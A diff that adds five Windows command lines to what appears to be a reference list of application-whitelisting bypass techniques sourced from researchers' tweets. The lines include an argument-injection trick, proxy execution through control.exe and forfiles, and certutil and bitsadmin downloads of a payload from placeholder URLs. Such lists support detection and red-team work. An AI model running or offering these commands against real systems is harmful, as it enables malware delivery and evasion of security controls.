@@ -460,3 +460,8 @@ https://twitter.com/gN3mes1s/status/941315826107510784
 https://twitter.com/Hexacorn/status/776122138063409152
 
 
+SyncAppvPublishingServer.exe "n;calc"
+control.exe payload.dll
+forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
+certutil -urlcache -split -f [URL] [output-file]
+bitsadmin /transfer [job-name] /download /priority normal [URL-to-payload] [output-path] 
